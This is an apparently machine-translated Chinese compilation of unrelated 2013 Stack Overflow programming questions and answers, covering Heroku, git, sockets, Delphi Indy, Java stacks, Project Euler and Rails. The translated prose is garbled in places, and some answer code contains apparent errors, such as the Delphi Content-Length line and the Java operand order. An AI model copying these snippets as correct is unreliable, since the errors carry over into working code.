> 时间：2013-04-06T00:48:54.273
> 
> 标签：ruby, heroku, resque, procfile

我正在尝试在 heroku 上加载一个简单的 ruby​​ 应用程序，该应用程序使用 resque 定期运行后台任务，该任务检查电子邮件帐户。它与工头在本地运行良好，但在heroku上不断崩溃。

我想这可能`Error R10 (Boot timeout) -> Web process failed to bind to $PORT within 60 seconds of launch`来自我的 while 循环，它是永久的，因此超过 60 秒？我应该使用某种不同的进程来启动 smsnotify.rb 吗？

任何帮助将不胜感激！

我的heroku日志：

```
2013-04-06T20:49:15+00:00 heroku[slugc]: Slug compilation finished
2013-04-06T20:49:18+00:00 heroku[web.1]: Starting process with command `bundle exec ruby smsnotify.rb -p 9129`
2013-04-06T20:49:21+00:00 app[web.1]: /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.0.0/lib/active_support/multibyte.rb:26: warning: already initialized constant VALID_CHARACTER
2013-04-06T20:50:19+00:00 heroku[web.1]: Error R10 (Boot timeout) -> Web process failed to bind to $PORT within 60 seconds of launch
2013-04-06T20:50:19+00:00 heroku[web.1]: Stopping process with SIGKILL
2013-04-06T20:50:20+00:00 heroku[web.1]: Process exited with status 137
2013-04-06T20:50:20+00:00 heroku[web.1]: State changed from starting to crashed 
```

我的档案：

```
web: bundle exec ruby smsnotify.rb -p $PORT
resque: env TERM_CHILD=1 bundle exec rake jobs:work 
```

smsnotify.rb：

```
require "./email_checker"
require 'hirefire'
require 'resque' 
Resque.redis = 'redis://redistogo:removed:removed/'
HireFire::Initializer.initialize!

while true do
  Resque.enqueue(EmailChecker)
  sleep 30
  puts "Starting Email Job"
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T19:55:48.153

您没有启动绑定到端口的进程，因此它在抱怨。

您只需将您的 Procfile 更改为“worker”而不是“web”

如果你有一个网络前端，那么你需要一个工人和一个网络

# screen - Virtualbox窗口剪切

> ID：15845804
> 
> 赞同：-2
> 
> 时间：2013-04-06T00:49:37.013
> 
> 标签：screen, aptana, virtualbox, graphic

![截屏](https://i.stack.imgur.com/5SAEw.png)

在图像中，“更多选项”被明显地从窗口中截断。我没有滚动条来访问这些选项。我试图改变决议。这张照片是在无缝模式下拍摄的，在比例模式下，“更多选项”不显示。如果有人能告诉我如何设置/调整它，那将非常有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:54:00.063

将虚拟机中的屏幕分辨率降低到小于或等于物理 PC 中的分辨率。

# c - 帮我创建这个随机数

> ID：15845809
> 
> 赞同：-2
> 
> 时间：2013-04-06T00:26:10.793
> 
> 标签：c

我正在尝试使用 rand 生成一个随机数，如下所示：

```
return a + ( rand( ) % n ); 
```

> 其中 a 是移位值（即，所需连续整数范围内的第一个数字），n 是缩放因子（即，所需连续整数范围的宽度）。
> 
> -- C 如何编程第 6 版 - Deitel

我把它写成：

```
return 1 + ( rand( ) % 1000 ); 
```

它可以工作，但是当我编写如下代码时：

```
return 1000 + ( rand( ) % 1112 ); 
```

我最终得到了大得离谱的数字，例如 1756 和 1877。这是最后出现的两个输出。

我将值作为整数返回给 printf 语句中的函数调用，但我对工作语句做同样的事情，所以我不认为它是我调用函数的方式。

我究竟做错了什么...？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T00:43:59.417

你没有做错任何事。错的是你的期望。

a 是它可以生成的可能的最小数字，但它可以生成的最大数字不是 n... n 是范围大小，因此它可以生成的最大数字是 a+n。重要的是不仅要复制算法和代码，还要理解它为什么起作用。让我们来看看：

```
return 1000 + ( rand( ) % 1112 ); 
```

rand() 的范围是多少？0 到 RAND_MAX 之间的任何数字（这是一个非常大的数字。

(rand() % 1112) 的范围是多少？首先，查找模运算。当您将正整数除以 1112 时，可能的余数是多少？它可以是 0（例如，0/1112），或高达 1111 1111/1112 的余数为 1111）但之后它会循环返回（1112/1112 的余数为 0，1113/1112 的余数为 1，等等）。

现在，1000 + 的范围是多少（从 0 到 1111 的任何数字）？

# python - 套接字无法连接

> ID：15845814
> 
> 赞同：0
> 
> 时间：2013-04-06T00:51:59.417
> 
> 标签：python, sockets, python-2.7

**问题**

如何修复我的程序以使其始终连接套接字？另外，请测试您的代码。我已经看到了很多关于这个的答案，但没有一个有效。

非常感谢你的帮助。

**背景**

有一段时间，我一直在开发一个通过 LAN 发送消息的程序。我一直在努力将我对 GUI 和套接字的知识整合到这个项目中。但是，*无论我做什么，套接字都无法保持连接。*

[我已经问了很多关于这个](https://stackoverflow.com/users/1993598/xxmbabanexx?tab=questions&sort=newest)的问题，但无论如何我都无法找到正确的解决方法。我相信这是我的错——我是自学成才的，也许没有问过正确的问题。这一次，我选择了笼统的陈述；请原谅我缺乏技巧，但这似乎是目前最好的方法。[这是我在粘贴箱上的代码的链接。](http://pastebin.com/rp17qaSL)我在下面列出了最有可能出现问题的部分。

**错误信息**

```
('localhost', 1234)
Socket created
Socket bind complete
Socket now listening
Exception in Tkinter callback
Traceback (most recent call last):
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk/Tkinter.py", line 1410, in __call__
    return self.func(*args)
  File "/Volumes/XXMBABANEXX'S USB/Python Programs/Sockets/IM Project/Server/Functions/Simple Server.py", line 148, in <lambda>
    command = lambda: send_msg(s,message))
  File "/Volumes/XXMBABANEXX'S USB/Python Programs/Sockets/IM Project/Server/Functions/Simple Server.py", line 82, in send_msg
    conn.sendall(my_message)
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/socket.py", line 224, in meth
    return getattr(self._sock,name)(*args)
error: [Errno 57] Socket is not connected 
```

**相关代码**

由于错误消息表明我的`send_msg`功能有问题，因此我决定将其包含在下面。

```
def send_msg(conn, message):

    """Send Messages"""
    #Send some data to the remote server
    my_message = message.get("0.0", END)

     #set the whole string
    conn.sendall(my_message) 
```

非常感谢您的所有帮助。这个问题困扰了我好几个月，我拒绝放手。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T01:02:31.927

在您知道如何爬行之前，您正在尝试运行。

扔掉 Tk 和穿线。查看[SocketServer](http://docs.python.org/2/library/socketserver.html)示例并运行它们。从那开始工作，这样您就可以获得您似乎缺乏的基本套接字理解。

如您所知，StackOverflow 的人不太可能去查看您的 pastebin 代码。我确实看过它，它是多余的和令人困惑的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T02:37:10.500

我将从为客户端和服务器创建单独的 python 文件开始。如果他们要共享通用功能以及不共享什么，只需编写一个 common.py 文件并将它们导入两者。

浏览您的粘贴箱代码后，我看到的最大错误是您没有调用 SERVER_LOOP 函数。

在第90行，添加Thread(target = SERVER_LOOP, args = (s,)).start() #启动服务器线程

其次，您在第 91 行创建的线程将在执行 client.send() 后立即退出。无论您如何创建它，Python 垃圾收集都会拆除套接字。在其中放一个 time.sleep(5) 并将 client.send("sup") 包装在 while 1==1: 循环中

我强烈建议您找到一些关于在 python 中创建 python TCP 客户端和服务器的好示例代码。这是一个好的开始：[http ://wiki.python.org/moin/TcpCommunication](http://wiki.python.org/moin/TcpCommunication)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T01:03:36.687

您在错误的套接字上发送数据——您需要在客户端套接字上发送数据，而不是在侦听套接字上。服务器的一般模式如下所示：

```
# Set up the listening socket
listen_socket = socket.socket(...)
listen_socket.bind(...)
listen_socket.listen(...)

# Accept connections and process them
while should_continue_running:
    client_socket, client_addr = listen_socket.accept()

    # All communication with the new client should now happen on client_socket,
    # NOT on listen_socket:
    client_socket.recv(...)
    client_socket.send(...)
    ...

    client_socket.close() 
```

# python - Python缩进错误AFTER语句

> ID：15845816
> 
> 赞同：0
> 
> 时间：2013-04-06T00:53:02.993
> 
> 标签：python, indentation, arcpy

我在 Python IDLE 中不断收到意外的缩进错误，但奇怪的是，对我来说，它是在语句之​​后。我在记事本++中检查了它，并尝试删除空格，然后手动添加4，即不是选项卡。下面是代码；该错误在 field_value 语句之后突出显示。我们欢迎所有的建议

一世

```
import arcpy, sys

arcpy.env.workspace = "C:\\"
shapefile = "USCancer2000.shp"
field_name = "friday"

#Add the field
arcpy.AddField_management(shapefile,field_name,"LONG", "","","","","NULLABLE","NON_REQUIRED","")

cursor = arcpy.UpdateCursor(shapefile)

for row in cursor:
    #Get the value of each of our fields, and put them into variables
    c1 = row.getValue("Cnt1")
    c2 = row.getValue("Cnt2")
    c3 = row.getValue("Cnt3")
    p1 = row.getValue("Pop1")
    p2 = row.getValue("Pop2")
    p3 = row.getValue("Pop3")

    #check for missing values, assuming that non-missing values are all greater than or equal to zero
    try: 
        if((min(c1,c2,c3,p1,p2,p3) < 0) or ((p1+p2+p3) == 0) ):  t
            field_value = 0
        else:
            field_value= 1.0 
```

错误在 field_value= 1.0 之后

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:02:14.847

它应该是

```
else:
    field_value = 1.0 * (c1+c2+c3)/(p1+p2+p3)
print "done" 
```

# delphi - Indy 10 TIdHttpServer 缺少 MaxConnectionReply 属性

> ID：15845818
> 
> 赞同：0
> 
> 时间：2013-04-06T00:53:35.857
> 
> 标签：delphi, indy, indy10

我正在使用 Indy10 并使用从**`TIdHttpServer`**. 在我的子类中，我重写了该**`DoMaxConnectionsExceeded`**方法。**`MaxConnections`**当超过时，这似乎是正确的。

在早期的 Indy 版本中，至少根据 Remy Lebeau[在这里](http://www.delphigroups.info/2/7/209514.html)的评论，**`MaxConnectionReply`**在`TIdHttpServer`. `MaxConnections`如果超出，这可用于创建自定义消息。Indy 10 似乎并非如此。

Indy10 有没有一种方法可以在`MaxConnections`超出时创建自定义消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T20:20:49.603

正如我在您链接到的线程中所述，`MaxConnectionReply`由 实现`TIdCmdTCPServer`，它`TIdHTTPServer`不是派生自。由于您正在覆盖`DoMaxConnectionsExceeded()`，您必须手动将自己的回复发送给客户端，并确保它是正确的 HTTP 格式，例如：

```
procedure TMyHttpServer.DoMaxConnectionsExceeded(AIOHandler: TIdIOHandler);
var
  Html: TIdBytes;
begin
  Html := ToBytes('<html><body>500 - Too many connections</body></html>');
  AIOHandler.WriteLn('HTTP/1.0 500 Too many connections');
  AIOHandler.WriteLn('Content-Type: text/html');
  AIOHandler.WriteLn('Content-Length: ' + IntToStr(Html));
  AIOHandler.WriteLn('Connection: close');
  AIOHandler.WriteLn;
  AIOHandler.Write(Html);
end; 
```

# xcode - 使用核心数据保存分段控制时遇到问题

> ID：15845820
> 
> 赞同：1
> 
> 时间：2013-04-06T00:53:39.977
> 
> 标签：xcode, core-data, uisegmentedcontrol

我认为这个问题将是一个简单的问题，但它提供了一些更难和令人沮丧。

我正在使用 UISegmentedControl 进行选择，然后使用 NSNumber 实体保存到核心数据。不幸的是，当我尝试将段控件中的整数转换为 NSNumber 时，它出现（空）。下面是我的问题的示例代码。

```
//  ViewController.h

#import <UIKit/UIKit.h>
#import "Object.h"

@interface ViewController : UIViewController

@property (weak, nonatomic) IBOutlet UISegmentedControl *segmentOutlet;

@property (strong, nonatomic) Object *currentObject;  //core data object with an entity named subObject as an NSNumber

- (IBAction)segmentControlSelected:(id)sender;

@end

//ViewController.m

-(IBAction)segmentControllerSelected
    {
    [self.segmentOutlet selectedSegmentIndex]  // segment control
    currentObject.subObject = [NSNumber numberWithInt:([self.segmentOutlet selectSegmentIndex]);
NSLog(@"the another Object number is %@", currentObject.subObject);   
    } 
```

NSLog %@ 结果是（null），所以我不确定如何正确。

我才刚刚开始学习编程，所以这可能是一个基本的菜鸟错误。谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:18:12.947

您`segmentOutlet`需要指定为`strong`. 内存系统在某个时候将其丢弃；然后，当您尝试`self.segmentOutlet`返回值为`nil`. 之后调用`selectSegmentIndex`失败，默认情况下返回`nil`，你最终会得到'null'。尝试：

```
@property (strong, nonatomic) IBOutlet UISegmentedControl *segmentOutlet; 
```

# git - 推送到远程存储库时出现 git push 错误

> ID：15845823
> 
> 赞同：11
> 
> 时间：2013-04-06T00:54:16.660
> 
> 标签：git, heroku

尝试将更改推送到远程存储库时出现以下错误。

**命令**

`git push heroku`

**错误**

`fatal: You are pushing to remote 'heroku', which is not the upstream of your current branch 'master', without telling me what to push to update which remote branch.`

任何人都可以请告知可能导致相同的原因吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-06T01:00:33.563

我怀疑你没有远程配置。

push 喜欢知道要推动什么以及在哪里推动它。通常配置 git 以便它自动跟踪分支（本地 - 远程对）。

尝试推送：`git push heroku master`假设 master 是您的本地分支，heroku 是远程分支。

此外，要查看是否未配置远程，（l）列出您的配置或（e）编辑它： `git config -l / -e`

由于 Felix 在我之前，我将通过设置遥控器来扩展我的答案：

*   [这个主题很好的问题](https://stackoverflow.com/questions/7259535/git-setting-up-a-remote-origin)
*   [Git Guys 解释配置的远程部分](http://www.gitguys.com/topics/the-configuration-file-remote-section/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-06T01:30:45.807

**git config -l**会告诉你：

[branch.master.remote] 和 [branch.master.merge]

实际上，它们是 git pull/push 的默认行为，例如**git push** == **git push [branch.master.remote] [branch.master.merge]**。

默认情况下，[branch.master.remote] = origin，[branch.master.merge] = master，所以在这种情况下**git push** = **git push origin master**。

但是，在您的情况下，您的来源 [branch.master.remote] 不是**heroku**，并且 git 不知道您要推送到**heroku***的哪个分支，因此您必须将其指向 git。

* * *

## 回答 #3

> 赞同：-4
> 
> 时间：2013-09-06T21:55:40.873

它可能比这更简单，尝试运行 heroku 登录，如果 heroku 没有被重新配置为一个命令，那么你就没有安装 heroku 工具带，如果是这种情况，请按照该站点上的说明操作[https://toolbelt.heroku .com/debian](https://toolbelt.heroku.com/debian)适用于您的操作系统

# java - 堆栈从后缀到中缀的转换

> ID：15845824
> 
> 赞同：0
> 
> 时间：2013-04-06T00:54:18.750
> 
> 标签：java, stack, postfix-notation

您好，我正在练习一些 Java 堆栈，并且正在尝试解决有关堆栈的问题。我试图编写一个采用后缀表示法并将其转换为中缀的方法。这是我到目前为止所拥有的：

```
`
public void convertion() {
        Stack<Integer> stack;          // For evaluating the expression.
        stack = new Stack<Integer>();  // Make a new, empty stack.

        Scanner scan = new Scanner(postfix);

        int t1, t2 = 0;     //Operands

        boolean check = false;

        while (scan.hasNext() && !check) {
            if (scan.hasNextInt()) {
                int operand = scan.nextInt();
                stack.push(operand);
            } else {
                char operator = scan.next().charAt(0);
                try {

                        while(stack.)

                } catch (EmptyStackException e) {
                    answer = "Malformed postfix expression";
                    check = true;
                }

            }
        }
        scan.close();
        try {
            answer = "" + stack.pop();
        } catch (EmptyStackException e) {
            answer = "Malformed postfix expression";
        }
    }
` 
```

我遇到问题的部分是我应该在尝试部分上放什么。基本上我将我找到的所有数字推入堆栈，但是一旦我找到一个运算符，我如何合并两个操作数和运算符。

谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-06T02:43:49.723

您想弹出顶部的两个堆栈元素，对它们执行适当的操作，然后推回结果：

```
try {
    int o1 = stack.pop().intValue();
    int o2 = stack.pop().intValue();
    switch (operator) {
        case '+': stack.push(new Integer(o1 + o2));
                  break;
        case '-': stack.push(new Integer(o1 - o2));
                  break;
        ...
    }
}
catch (EmptyStackException e) {
    ... 
```

# javascript - 在 IE 中检测 texbox clear-event。单击特定于 IE 的清除框时，如何清除 IE（Internet Explorer）中的输入类型 =“文本”（文本框）？

> ID：15845827
> 
> 赞同：16
> 
> 时间：2013-04-06T00:54:36.140
> 
> 标签：javascript, textbox

在 Internet Explorer 中，当您开始在文本框中输入内容时，会显示一个类似 x 的小按钮。单击此图标时如何检测事件？有事件类型吗？

```
<input type="text" value ="" id ="qsearch" name="qsearch"
    onBlur="qsearchLookup(this.value);" OnClick="qsearchLookup(this.value);"
    onkeyup="qsearchLookup(this.value)"  size="26">

function qsearchLookup(searchVal){
    document.getElementById("qsearch").value="";
} 
```

![在此处输入图像描述](https://i.stack.imgur.com/LDqzx.png)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-06T01:36:53.323

我不知道这个类似 x 的小按钮的特殊事件，我认为它不存在，但你可以使用[输入](http://www.w3.org/TR/2012/CR-html5-20121217/forms.html#event-input-input)事件（`oninput="qsearchLookup(this.value)"`在你的情况下）来捕捉这个变化。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2016-10-10T13:25:13.173

我不确定，如果仍然有人在寻找解决方案。不幸的是，没有可用于***clear(X) 图标***的事件处理程序，但是下面的代码片段/技巧对我有用。CSS完成隐藏***清除（X）图标***，如果您不想隐藏***清除（X）图标***但需要处理，那么JS代码片段会有所帮助。在IE 8,9,10,11中验证并且它工作正常

***CSS技巧：***

`#textFieldId::-ms-clear {display: none;}`-- 对于特定的文本字段

或者

`input[type=text]::-ms-clear { display: none; }`-- 适用于范围内的所有文本字段

***或者***

***JavaScript 技巧（将文本字段值重置为空/空白并触发 html 事件 KeyUp。因此，您可以根据需要进行更改）***

```
$('#textFieldId').bind("mouseup", function() {
        var $input = $(this);
        var oldValue = $input.val();
        if (oldValue == "") {
            return;
        }
        setTimeout(function() {
            var newValue = $input.val();
            if (newValue == "") {
                $input.trigger("keyup");
            }
        }, 1);
    }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-09T10:36:35.730

这对我来说效果很好:)

```
$input.addEventListener('mouseup', function(){
    setTimeout(function(){
        if ($input.value === '') do_stuff();
    }, 1)
}); 
```

`$input`作为输入元素的引用。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-07-10T13:44:12.053

```
input.on('input propertychange',function(e){}) 
```

这适用于 ie10（输入）和 ie8（属性更改），但不适用于 ie9

我实际上用 mousedown 事件为 ie9 修复了它，不是很漂亮，但是那和 mouseup 是唯一触发它的事件

# c++ - 欧拉计划 #27

> ID：15845835
> 
> 赞同：0
> 
> 时间：2013-04-06T00:55:39.283
> 
> 标签：c++

我在 Project Euler 中挑战自己，但目前卡在问题 27 上，其中问题指出：

> 欧拉发表了非凡的二次公式：
> 
> n² + n + 41
> 
> 事实证明，该公式将为 n = 0 到 39 的连续值产生 40 个素数。但是，当 n = 40 时，402 + 40 + 41 = 40(40 + 1) + 41 可以被 41 整除，当然当 n = 41, 41² + 41 + 41 显然可以被 41 整除。
> 
> 使用计算机，发现了令人难以置信的公式 n² 79n + 1601，它为 n = 0 到 79 的连续值产生了 80 个素数。系数 79 和 1601 的乘积是 126479。
> 
> 考虑形式的二次方程：
> 
> n² + an + b，其中 |a| 1000 和 |b| 1000
> 
> 其中 |n| 是 n 的模数/绝对值，例如 |11| = 11 和 |4| = 4 求二次表达式的系数 a 和 b 的乘积，从 n = 0 开始，该二次表达式产生 > 连续 n 值的最大素数数。

我编写了以下代码，它很快就给了我答案，但它是错误的（它让我吐了（-951）*（-705）= 670455）。有人可以检查我的代码以查看我的错误在哪里吗？

```
#include <iostream>
#include <vector>
#include <cmath>
#include <time.h>
using namespace std;

bool isprime(unsigned int n, int d[339]);
int main()
{
    clock_t t = clock();
    int c[] = {13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311};
    int result[4];
    result[3] = 0;
    for (int a = -999; a < 1000; a+=2)
    {
        for (int b = -999; b < 1000; b+=2)
        {
            bool prime;
            int n = 0, count = 0;
            do
            {
                prime = isprime(n*n + a*n + b, c);
                n++;
                count++;
            } while (prime);
            count--;
            n--;
            if (count > result[3])
            {
                result[0] = a;
                result[1] = b;
                result[2] = n;
                result[3] = count;
            }
        }
        if ((a+1) % 100 == 0)
            cout << a+1 << endl;
    }
    cout << result[0] << endl << result[1] << endl << result[2] << endl << result[3] << endl << clock()-t;
    cin >> result[0];
    return 0;
}

bool isprime(unsigned int n, int d[339])
{
    int j = 0, l;
    if ((n == 2) || (n == 3) || (n == 5) || (n == 7) || (n == 11))
        return 1;
    if ((n % 2 == 0) || (n % 3 == 0) || (n % 5 == 0) || (n % 7 == 0) || (n % 11 == 0))
        return 0;
    while (j <= int (sqrt(n) / 2310))
    {
        for (int k = 0; k < 339; k++)
        {
            l = 2310 * j + d[k];
            if (n % l == 0)
               return 0;
        }
        j++;
    }
    return 1;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:17:29.660

isprime 函数有一个错误。

在您的函数中，您检查所有 2310 * j + d[k] 其中 j < int (sqrt(n) / 2310)) 以确保目标 n 是质数。但是，还需要 l < sqrt(n) 的附加条件，否则您将过度排除某些素数。

例如，当 a = 1、b = 41 和 n = 0 时，您的函数将检查 41 是否是从 j = 0 开始的素数。所以 41 是否可以被 2310 * 0 + d[7] = 41 整除是也经过验证，导致虚假退货。

```
This version should be correct:
bool isprime(unsigned int n, int d[])
{
    int j = 0, l;
    if ((n == 2) || (n == 3) || (n == 5) || (n == 7) || (n == 11))
        return 1;
    if ((n % 2 == 0) || (n % 3 == 0) || (n % 5 == 0) || (n % 7 == 0) || (n % 11 == 0))
        return 0;
    double root = sqrt(n);
    while (j <= int (root / 2310))
    {
        for (int k = 0; k < 339; k++)
        {
            l = 2310 * j + d[k];
            if (l < root && n % l == 0)
                return 0;
        }
        j++;
    }
    return 1;
} 
```

# ruby-on-rails - ruby on rails 教程授权

> ID：15845837
> 
> 赞同：0
> 
> 时间：2013-04-06T00:55:46.177
> 
> 标签：ruby-on-rails, ruby, authorization, railstutorial.org

我正在阅读最新版本的 Michael Hartl 教程，我收到以下消息：

失败：

1) UserPages 使用有效信息编辑失败/错误：登录用户 NoMethodError：未定义的方法`sign_in' for #<RSpec::Core::ExampleGroup::Nested_4::Nested_4::Nested_3:0x9f1b1bc> # ./spec/requests/user_pages_spec.rb:66:in`块（3 级）在'

同一条消息九次。

在“更新用户”之前，我一直运行绿色。

在 9.2 中，我更改了教程中提到的以下程序。我尝试了10多个小时，最后我放弃了。请你帮帮我。

胡安·卡里略

```
USERS.CONTROLLER.RB

class UsersController < ApplicationController

  before_filter :signed_in_user, only: [:edit, :update]

  def new
      @user = User.new
  end

  def show
    @user = User.find(params[:id])
  end

  def create
    @user = User.new(params[:user])
    if @user.save
      sign_in @user
      flash[:success] = "Welcome to the Sample App!"
      redirect_to @user
    else
      render 'new'
    end
  end

  def show
    @user = User.find(params[:id])
  end

  def edit
     @user = User.find(params[:id])
  end

  def update
     @user = User.find(params[:id])
    if @user.update_attributes(params[:user])
       flash[:success] = "Profile updated"
       sign_in @user
       redirect_to @user
     else
       render 'edit'
    end
  end

  private

  def signed_in_user
    redirect_to signin_url, notice: "Please sign in." unless signed_in?
  end
end

AUTHENTICATION_PAGES_SPEC.RB 
```

需要'spec_helper'

描述“身份验证”做

主题{页面}

在 { 访问 signin_path } 之前描述“登录页面”

```
it { should have_selector('h1', text: 'Sign in') }
it { should have_selector('title', text: 'Sign in') }

describe "with valid information" do
  let(:user){ FactoryGirl.create(:user) }
  before do
    fill_in "Email", with: user.email.upcase
    fill_in "Password", with: user.password
    click_button"Sign in"
  end
  it { should have_selector('title', text: user.name) }
  it { should have_link('Profile', href:user_path(user)) }
  it { should have_link('Settings', href:edit_user_path(user)) }
  it { should have_link('Sign out', href:signout_path) }
  it { should_not have_link('Sign in', href:signin_path) }
  describe "followed by signout" do
    before { click_link("Sign out") }
    it { should have_link('Sign in') }
  end
end

describe "with invalid information" do
  before { click_button"Sign in"}
  it { should have_selector('title', text:'Sign in') }
  it { should have_selector('div.alert.alert-error',text: 'Invalid') }

  describe "after visiting another page" do
    before { click_link"Home" }
    it { should_not have_selector('div.alert.alert-error') }
  end
end 
```

结尾

```
describe "authorization" do

describe "for non-signed-in users" do
  let(:user) { FactoryGirl.create(:user) }

  describe "in the Users controller" do

    describe "visiting the edit page" do
      before { visit edit_user_path(user) }
      it { should have_selector('title', text: 'Sign in') }
    end

    describe "submitting to the update action" do
      before { put user_path(user) }
      specify { response.should redirect_to(signin_path) }
    end
  end
end 
```

结束结束

USER_PAGES_SPEC.RB

需要'spec_helper'

描述“UserPages”做主题{页面}

```
 describe "profile page" do

    let(:user) { FactoryGirl.create(:user) }
    before { visit user_path(user) }

    it { should have_selector('h1', text: user.name) }

    it { should have_selector('title', text: user.name) }

 end

describe "signup page" do
    before { visit signup_path }
    it { should have_selector('h1', text: 'Sign Up') }
    it { should have_selector('title', text: full_title('Sign Up')) }
end

describe "signup" do
    before { visit signup_path }
    let(:submit) { "Create my account" }

    describe "with invalid information" do
        it "should not create a user" do
            expect { click_button submit }.not_to change(User, :count)
        end

        describe "after submission" do
            before { click_button submit }

            it { should have_selector('title', text: 'Sign Up') }
            it { should have_content('error') }
        end
    end

    describe "with valid information" do
        before do
            fill_in "Name", with: "Example User"
            fill_in "Email", with: "user@example.com"
            fill_in "Password", with: "foobar"
            fill_in "Confirmation", with: "foobar"
        end
        it "should create a user" do
            expect { click_button submit }.to change(User, :count).by(1)
        end

        describe "after saving the user" do
            before { click_button submit }
            let(:user){ User.find_by_email('user@example.com') }
            it { should have_selector('title', text: user.name) }
            it { should have_selector('div.alert.alert-success', text: 'Welcome') }

            it { should have_link('Sign out') }

        end
    end 
```

结尾

```
 describe "edit" do
    let(:user) { FactoryGirl.create(:user) }
    before do
        sign_in user
        visit edit_user_path(user)
    end

    describe "page" do
      it { should have_selector('h1',    text: "Update your profile") }
      it { should have_selector('title', text: "Edit user") }
      it { should have_link('change', href: 'http://gravatar.com/emails') }
    end

    describe "with invalid information" do
      before { click_button "Save changes" }

      it { should have_content('error') }
    end

    describe "with valid information" do
        let(:new_name) { "New Name" }
        let(:new_email) { "new@example.com" }
        before do
            fill_in "Name", with: new_name
            fill_in "Email", with: new_email
            fill_in "Password", with: user.password
            fill_in "Confirm Password", with: user.password
            click_button "Save changes"
        end
        it { should have_selector('title', text: new_name) }
        it { should have_selector('div.alert.alert-success') }
        it { should have_link('Sign out', href:signout_path) }
        specify { user.reload.name.should == new_name }
        specify { user.reload.email.should == new_email }
    end 
```

结尾

结尾

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T02:27:02.407

这告诉您该`sign_in`方法尚未定义。您需要`utilities.rb`按照教程中的 9.6添加

# mongodb - 使用 MongoDB 和 D3 减少大型数据集

> ID：15845846
> 
> 赞同：0
> 
> 时间：2013-04-06T00:57:28.830
> 
> 标签：mongodb, d3.js

我正在研究 D3 可视化，幸运的是已经取得了一些进展。但是，我遇到了一个问题……老实说，我不确定它是 MongoDB 问题还是 D3 问题。你看，我正在尝试从一组传感器点制作一系列图表（我的 JSON 对象包含时间戳、光线、温度、湿度和运动检测级别或每个数据点）。但是，我的传感器每 8 秒将数据上传到我的 MongoDB 数据库。所以，如果我在 MongoDB 数据库中查询仅 1 天的数据……我会得到 10,800 个数据点。更糟糕的是，如果我要 1 个月的数据，我会被 324,000 个数据点淹没。我的问题是我的 d3 可视化在处理超过 1000 个点时会变慢（我 m 在四个不同的图表上可视化数据，每个图表使用一个画笔来选择图表上的某个域。有没有办法限制我试图可视化的数据量？使用 MongoDB 做得更好吗（所以基本上过滤我正在查询的数据，并且只根据我试图查询的时间值的大小来获取每个第 n 个数据点）。或者，还有更好的方法？检索到整个数据集后，是否应该尝试使用 D3 过滤数据？减少我需要处理的点数的最佳方法是什么？提前致谢。或者，还有更好的方法？检索到整个数据集后，是否应该尝试使用 D3 过滤数据？减少我需要处理的点数的最佳方法是什么？提前致谢。或者，还有更好的方法？检索到整个数据集后，是否应该尝试使用 D3 过滤数据？减少我需要处理的点数的最佳方法是什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:20:46.060

Mongodb 擅长过滤。如果您真的只需要数据的子集，请在`find`查询中指定 - 这可能会限制为时间子集，或者如果您很聪明，只获取每小时第一分钟或类似的数据。

[或者您可以使用聚合框架](http://docs.mongodb.org/manual/core/aggregation/)从字面上减少来自 mongodb 的数据量。这可用于获得部分总和或平均值或类似信息。

# java - java空指针通过访问第二个类

> ID：15845851
> 
> 赞同：-1
> 
> 时间：2013-04-06T00:57:58.023
> 
> 标签：java

嗨，我的 java 编码有一些问题。我不知道如何指向一个对象。

